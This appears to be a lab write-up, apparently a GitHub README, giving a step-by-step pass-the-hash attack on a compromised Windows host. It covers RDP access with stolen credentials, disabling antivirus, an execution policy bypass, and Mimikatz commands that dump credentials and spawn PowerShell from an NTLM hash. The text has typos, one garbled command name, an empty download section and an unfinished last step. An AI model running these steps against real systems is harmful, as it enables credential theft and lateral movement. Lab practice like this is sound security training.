This attack was carried out on a compromised windows machine in the network.
Checklist before carryinng out the attack

1. Get access to the target ( Here, i used xfreerdp3 with a compromised credential) via the command `proxychains xfreerdp3 /u:usr /p:pass /cert:ignore /v:10.10.10.21`

screenshot below 
<img width="998" height="287" alt="image" src="https://github.com/user-attachments/assets/28391551-3944-45d8-9a83-3128890f0bbc" />

2. Disable the antivirus
   sdsd
   <img width="962" height="738" alt="image" src="https://github.com/user-attachments/assets/93840b64-f72b-471f-8c15-1ec36bc041d2" />

3. Run PowerShell as admin, and run an execution policy bypass command 
<img width="998" height="287" alt="image" src="https://github.com/user-attachments/assets/267c3893-a389-402a-bd41-40814a7c12c6" />

   
The attack progression

## Downloading Mimikatz onto the target


## Utilizing Mimikatz to pass the hash
1. Execute mimikatz.exe and run " privilege::debug "
<img width="1007" height="252" alt="image" src="https://github.com/user-attachments/assets/85e7d259-1189-42dc-b029-ca9498ce7b20" />

2. Dumb the credentials in the compromised machine's memory using the command " sekurlsa::logon " 
<img width="1021" height="490" alt="image" src="https://github.com/user-attachments/assets/24397aa8-a1a3-4f8a-9fbf-90d2f402f6d8" />

3.  From the dumped credentials, choose a particular account and its hash to run the pass the hash attack. `sekurlsa::pth /domain:cyberware.firm /user:app-svc /ntlm:9b241c87d54a761a08a8cae4252f4dca /run:powershell.exe`
<img width="1032" height="458" alt="image" src="https://github.com/user-attachments/assets/323a58ff-acaf-48b5-9d94-5d79361ef3b8" />
This should spin up a new PowerShell running on the "COmromised machine" but with the privileges of the account used during the pass the hash attack.
4.  
